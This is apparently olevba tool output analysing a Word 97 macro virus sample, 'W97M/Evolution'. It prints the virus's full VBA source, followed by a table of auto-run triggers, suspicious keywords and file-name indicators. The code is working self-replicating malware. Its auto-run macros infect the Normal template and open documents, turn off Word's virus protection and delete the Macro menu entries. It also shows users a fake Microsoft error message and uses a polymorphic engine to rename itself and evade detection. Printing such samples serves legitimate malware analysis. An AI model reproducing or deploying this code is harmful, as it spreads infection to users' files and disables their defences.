olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Evolution.c-4e27380e60c650e1b964a641d29faff52be7414b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Evolution.c-4e27380e60c650e1b964a641d29faff52be7414b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KVCOTLUUH.bas 
in file: Virus.MSWord.Evolution.c-4e27380e60c650e1b964a641d29faff52be7414b - OLE stream: 'Macros/VBA/KVCOTLUUH'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 'Kaspersky Labs.
Public Source As String
 'MP
Public ByeMacro As String
 'Kaspersky Labs.
Public Hostinf As Boolean
 'MP
Public FileInf As Boolean
 'MP
Public FExport As String
Public PMExport As String
Public PMFile_Yes As Boolean
Public Ex_Yes As Boolean
 'Kaspersky Labs.
Public Filename As String
Public FileID As String
Public FileID2 As String
 'MP
Public Virname As String
Public FC_There As Boolean
 'Mike Pavluschick
Public FO_There As Boolean
 'MP
Public FP_There As Boolean
 'Mike Pavluschick
Public FN_There As Boolean
 'MP
Public FS_There As Boolean
 'Kaspersky Labs.
Public FSA_There As Boolean
Public VrusName As String
 'Mike Pavluschick
Public Armor As Boolean
 'Mike Pavluschick
Function Self_Recognition()
 'MP
On Error Resume Next
 'Kaspersky Labs.
Application.EnableCancelKey = wdCancelDisabled
 'Kaspersky Labs.
Open "C:\windows\system\vnames.cpl" For Input As #1
 'Mike Pavluschick
Do
 'MP
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Mike Pavluschick
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
 'Kaspersky Labs.
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
 'MP
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
 'Mike Pavluschick
newname:
Close #1
Open "C:\windows\system\vnames.cpl" For Append As #1
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
        End If
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
 'Kaspersky Labs.
lost:
Next Z
 'MP
Loop Until EOF(1)
 'Kaspersky Labs.
Close #1
 'Kaspersky Labs.
Dim Lib
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
 'MP
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
 'Kaspersky Labs.
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
 'Kaspersky Labs.
skip:
 'Mike Pavluschick
Next Lib
Loop Until EOF(1)
doccheck:
 'Mike Pavluschick
Close #1
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
 'Mike Pavluschick
Line Input #1, Virname
 'MP
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
 'Kaspersky Labs.
nope:
Next Lib
 'Kaspersky Labs.
Loop Until EOF(1)
 'MP
FileInf = False
leave:
 'Kaspersky Labs.
Close #1
End Function
Function Armor_Status()
Application.EnableCancelKey = wdCancelDisabled
 'MP
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
Offense:
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
 'Mike Pavluschick
End Function
 'Mike Pavluschick
Function Export_Code()
 'Kaspersky Labs.
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'Kaspersky Labs.
FExport = Dir("C:\windows\system\export.sys")
 'MP
If FExport = "Export.sys" Then Ex_Yes = True
 'MP
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
 'Kaspersky Labs.
Morph:
Randomize Timer
 'Mike Pavluschick
q = Int(Rnd(1) * 5) + 1
 'Kaspersky Labs.
For vi = 1 To q
 'MP
x = Int(Rnd(1) * 26)
 'Kaspersky Labs.
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
 'MP
If x = 4 Then a$ = "D"
 'MP
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
 'MP
If x = 7 Then a$ = "G"
 'Kaspersky Labs.
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
 'Kaspersky Labs.
If x = 10 Then a$ = "J"
 'Mike Pavluschick
If x = 11 Then a$ = "K"
 'MP
If x = 12 Then a$ = "L"
 'MP
If x = 13 Then a$ = "M"
 'Mike Pavluschick
If x = 14 Then a$ = "N"
 'MP
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
 'Mike Pavluschick
If x = 18 Then a$ = "R"
 'Mike Pavluschick
If x = 19 Then a$ = "S"
 'MP
If x = 20 Then a$ = "T"
 'MP
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
 'Kaspersky Labs.
If x = 25 Then a$ = "Y"
 'Mike Pavluschick
If x = 26 Then a$ = "Z"
 'MP
Filename = Filename + a$
 'Mike Pavluschick
Next vi
x = Int(Rnd(1) * 999) + 1
 'Kaspersky Labs.
FileID = "C:\windows\system\" & Filename & x & ".cpl"
 'Kaspersky Labs.
' RAPE v1.1 Export File ID Morph
Open "C:\windows\system\Export.sys" For Append As #1
 'Kaspersky Labs.
Print #1, FileID
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
 'Kaspersky Labs.
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
 'MP
Open "C:\windows\system\vnames.cpl" For Append As #1
 'MP
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
 'Mike Pavluschick
Next x
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
 'Mike Pavluschick
If CheckMe = "PMF1199.cpl" Then GoTo nextt
Do
 'Mike Pavluschick
On Error Resume Next
 'Kaspersky Labs.
Open "C:\windows\system\vnames.cpl" For Input As #1
Line Input #1, Virname
 'Kaspersky Labs.
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
 'Kaspersky Labs.
Loop Until EOF(1)
nextt:
Exit Function
 'Mike Pavluschick
Recognize:
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID
 'Mike Pavluschick
Close #1
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
 'MP
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
 'Kaspersky Labs.
Do
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
 'Mike Pavluschick
Line Input #1, Virname
 'Mike Pavluschick
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
 'Kaspersky Labs.
Loop Until EOF(1)
 'Mike Pavluschick
tryharder:
 'Mike Pavluschick
End Function
Function Polymorphic_Check()
On Error Resume Next
 'MP
Application.EnableCancelKey = wdCancelDisabled
 'Kaspersky Labs.
Open FileID2 For Input As #1
 'MP
Dim FC_Check
Do
    Line Input #1, FC_Check
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
 'Kaspersky Labs.
Dim FO_Check
Do
    Line Input #1, FO_Check
 'Mike Pavluschick
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
Dim FP_Check
Do
    Line Input #1, FP_Check
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
 'Mike Pavluschick
Loop Until EOF(1)
FN_Look:
 'MP
Dim FN_Check
 'MP
Do
    Line Input #1, FN_Check
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
 'Mike Pavluschick
Loop Until EOF(1)
FS_Look:
Dim FS_Check
Do
 'Mike Pavluschick
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
Loop Until EOF(1)
 'Kaspersky Labs.
FSA_Look:
 'Kaspersky Labs.
Dim FSA_Check
 'Mike Pavluschick
Do
 'MP
    Line Input #1, FSA_Check
 'Kaspersky Labs.
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
 'Mike Pavluschick
Loop Until EOF(1)
 'Kaspersky Labs.
End Function
 'Mike Pavluschick
Function Evolve()
 'Kaspersky Labs.
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'Mike Pavluschick
'RAPE v1.1 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
PM = Int(Rnd(1) * 150) + 1
If PM = 22 Then
 'MP
If FC_There = True Then Exit Function
 'Mike Pavluschick
Open FileID2 For Append As #1
 'MP
Print #1, "Sub FileClose()"
 'MP
Print #1, "On error resume next"
 'MP
Print #1, "Call Evolution"
 'Kaspersky Labs.
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
 'MP
End If
 'MP
If PM = 73 Then
 'Kaspersky Labs.
If FO_There = True Then Exit Function
Open FileID2 For Append As #1
 'Kaspersky Labs.
Print #1, "Sub FileOpen()"
 'Mike Pavluschick
Print #1, "on error resume next"
 'Kaspersky Labs.
Print #1, "Dialogs(wdDialogFileOpen)"
 'Mike Pavluschick
Print #1, "Call Evolution"
 'MP
Print #1, "end sub"
 'Kaspersky Labs.
Close #1
End If
 'Kaspersky Labs.
If PM = 69 Then
 'Mike Pavluschick
If FP_There = True Then Exit Function
 'Mike Pavluschick
Open FileID2 For Append As #1
 'Mike Pavluschick
Print #1, "Sub FilePrint()"
 'Mike Pavluschick
Print #1, "on error resume next"
 'Mike Pavluschick
Print #1, "Dialogs(wdDialogFilePrint)"
Print #1, "Call Evolution"
Print #1, "End sub"
Close #1
 'Kaspersky Labs.
End If
If PM = 122 Then
If FN_There = True Then Exit Function
Open FileID2 For Append As #1
 'Mike Pavluschick
Print #1, "Sub FileNew()"
 'Mike Pavluschick
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileNew)"
 'Kaspersky Labs.
Print #1, "Call Evolution"
Print #1, "End Sub"
 'Kaspersky Labs.
Close #1
 'MP
End If
 'Mike Pavluschick
If PM = 90 Then
If FS_There = True Then Exit Function
 'MP
Open FileID2 For Append As #1
 'Mike Pavluschick
Print #1, "Sub FileSave()"
Print #1, "on error resume next"
 'MP
Print #1, "call Evolution"
 'Kaspersky Labs.
Print #1, "wordbasic.filesave"
 'Mike Pavluschick
Print #1, "end sub"
 'Mike Pavluschick
Close #1
End If
If PM = 8 Then
 'Mike Pavluschick
If FSA_There = True Then Exit Function
 'Kaspersky Labs.
Open FileID2 For Append As #1
Print #1, "Sub FileSaveAs()"
 'Mike Pavluschick
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileSaveAs)"
 'Mike Pavluschick
Print #1, "Call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
 'MP
Close #1
 'Mike Pavluschick
End If
 'Mike Pavluschick
End Function
Function Norminf()
 'MP
On Error Resume Next
 'MP
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
 'Mike Pavluschick
Line Input #1, FileID2
 'Kaspersky Labs.
Close #1
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
        Open "C:\windows\system\vnames.cpl" For Append As #1
 'Mike Pavluschick
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
nexus:
 'Mike Pavluschick
    Next l
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
 'Kaspersky Labs.
End With
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
 'Mike Pavluschick
End Function
 'Kaspersky Labs.
Function FileInft()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'Kaspersky Labs.
Open "C:\windows\system\Export.sys" For Input As #1
 'Mike Pavluschick
Line Input #1, FileID2
Close #1
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
End With
Randomize Timer
WD = Int(Rnd(1) * 8) + 2
 'Kaspersky Labs.
For evo = 2 To WD
x = Int(Rnd(1) * 26)
 'MP
If x = 1 Then a$ = "A"
 'Kaspersky Labs.
If x = 2 Then a$ = "B"
 'Kaspersky Labs.
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
 'Mike Pavluschick
If x = 8 Then a$ = "H"
 'Kaspersky Labs.
If x = 9 Then a$ = "I"
 'MP
If x = 10 Then a$ = "J"
 'Mike Pavluschick
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
 'Mike Pavluschick
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
 'Mike Pavluschick
If x = 17 Then a$ = "Q"
 'MP
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
 'MP
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
 'MP
If x = 24 Then a$ = "X"
 'MP
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
 'Kaspersky Labs.
VrusName = VrusName + a$
Next evo
 'Kaspersky Labs.
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
 'Mike Pavluschick
Line Input #1, Virname
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
' RAPE v1.1 Macro Virus Name Randomizer - 2 to 8 letters
Loop Until EOF(1)
 'Mike Pavluschick
Close #1
 'Mike Pavluschick
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Kaspersky Labs.
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
 'MP
rite:
 'MP
Open "C:\windows\system\vnames.cpl" For Append As #1
 'Mike Pavluschick
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 'MP
Close #1
nex:
Next x
 'MP
End Function
 'Mike Pavluschick
Function Evolution()
 'MP
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Self_Recognition
 'MP
Call Armor_Status
 'MP
Call Export_Code
Call Polymorphic_Check
 'MP
Call Evolve
 'Kaspersky Labs.
If Hostinf = False Then Call Norminf
 'Kaspersky Labs.
If FileInf = False Then Call FileInft
 'MP
Options.VirusProtection = False
Options.ConfirmConversions = False
 'Mike Pavluschick
Options.SaveNormalPrompt = False
 'Mike Pavluschick
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
 'Mike Pavluschick
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 'MP
' W97M/Evolution
' W97M/Evolution .a Variant by Nex and Error
' Polymorphic Stealth Word97 Macro Virus
' All Things Must Change...
 'Kaspersky Labs.
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error
' RAPE v1.1 does:
' Randomly Morphs Source Code by Adding Random Remarks
 'Mike Pavluschick
' Randomly Selects Source Code Export File - Then Morphs it
 'Mike Pavluschick
' Randomly Creates Virus Macro Name
 'Mike Pavluschick
' Randomly Adds 1 to 6 Commands to Code
 'Mike Pavluschick
End Function
 'Kaspersky Labs.
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'MP
Call Evolution
 'Mike Pavluschick
WordBasic.filesave
 'Mike Pavluschick
End Sub
 'Kaspersky Labs.
Sub AutoExec()
On Error Resume Next
 'Mike Pavluschick
Application.EnableCancelKey = wdCancelDisabled
 'MP
Call Armor_Status
 'MP
Options.VirusProtection = False
Options.ConfirmConversions = False
 'MP
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 'MP
End Sub
 'MP
Sub AutoExit()
On Error Resume Next
 'Mike Pavluschick
Application.EnableCancelKey = wdCancelDisabled
 'Kaspersky Labs.
Call Evolution
 'Mike Pavluschick
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
If PMFile_Yes = True Then Exit Sub
 'Kaspersky Labs.
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
Print #1, "W97M/Evolution .a by Nex"
 'Mike Pavluschick
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
 'Mike Pavluschick
Close #1
 'Kaspersky Labs.
Open "C:\windows\system\Export.sys" For Input As #2
 'Mike Pavluschick
Line Input #2, FileID
 'Kaspersky Labs.
Close #2
 'MP
Open FileID For Append As #9
 'Kaspersky Labs.
Print #9, "' EOF"
 'Kaspersky Labs.
Close #9
 'Kaspersky Labs.
Open FileID For Input As #3
Randomize Timer
 'Mike Pavluschick
W = Int(Rnd(1) * 5) + 1
 'MP
For vir = 1 To W
 'Kaspersky Labs.
x = Int(Rnd(1) * 26)
 'Kaspersky Labs.
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
 'Mike Pavluschick
If x = 3 Then a$ = "C"
 'Mike Pavluschick
If x = 4 Then a$ = "D"
 'Kaspersky Labs.
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
 'MP
If x = 7 Then a$ = "G"
 'MP
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
 'MP
If x = 12 Then a$ = "L"
 'MP
If x = 13 Then a$ = "M"
 'MP
If x = 14 Then a$ = "N"
 'Mike Pavluschick
If x = 15 Then a$ = "O"
 'MP
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
 'Mike Pavluschick
If x = 18 Then a$ = "R"
 'MP
If x = 19 Then a$ = "S"
 'Kaspersky Labs.
If x = 20 Then a$ = "T"
 'Mike Pavluschick
If x = 21 Then a$ = "U"
 'Mike Pavluschick
If x = 22 Then a$ = "V"
 'MP
If x = 23 Then a$ = "W"
 'Mike Pavluschick
If x = 24 Then a$ = "X"
 'MP
If x = 25 Then a$ = "Y"
 'Mike Pavluschick
If x = 26 Then a$ = "Z"
 'Kaspersky Labs.
Filename = Filename + a$
 'Mike Pavluschick
Next vir
F = Int(Rnd(1) * 999) + 1
FileID2 = "C:\windows\system\" & Filename & F & ".cpl"
 'MP
Open FileID2 For Append As #4
 'Mike Pavluschick
Do
 'Kaspersky Labs.
inpux:
 'MP
Line Input #3, stuff
 'Mike Pavluschick
Print #4, stuff
 'Kaspersky Labs.
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
 'MP
    If t = 1 Then Z$ = " '" & Application.UserName
 'MP
    If t = 2 Then Z$ = " '" & Application.UserInitials
 'Mike Pavluschick
    If t = 3 Then Z$ = " '" & Application.UserAddress
 'Mike Pavluschick
    If t >= 4 Then GoTo inpux
 'Kaspersky Labs.
    Print #4, Z$
' Source Code Morpher - adds random remarks to Code (RAPE v1.1 by Error)
Loop Until stuff = "' EOF"
 'Kaspersky Labs.
Close #3
Close #4
 'Kaspersky Labs.
Kill "C:\windows\system\export.sys"
Open "C:\windows\system\Export.sys" For Append As #5
 'MP
Print #5, FileID2
 'Kaspersky Labs.
Close #5
 'MP
End Sub
 'MP
Sub AutoNew()
 'Mike Pavluschick
On Error Resume Next
 'Kaspersky Labs.
Application.EnableCancelKey = wdCancelDisabled
 'MP
Call Evolution
End Sub
 'Kaspersky Labs.
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
 'MP
Sub FileTemplates()
 'MP
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled
 'MP
End Sub
 'Mike Pavluschick
Sub ToolsMacro()
 'Kaspersky Labs.
Application.EnableCancelKey = wdCancelDisabled
End Sub
 'Kaspersky Labs.
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
 'Mike Pavluschick
End Sub
 'Mike Pavluschick
' "The most polymorphic Macro Virus to date...." - NAI
' EOF
 'Kaspersky Labs.
Sub FileNew()
On Error Resume Next
Dialogs (wdDialogFileNew)
Call Evolution
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

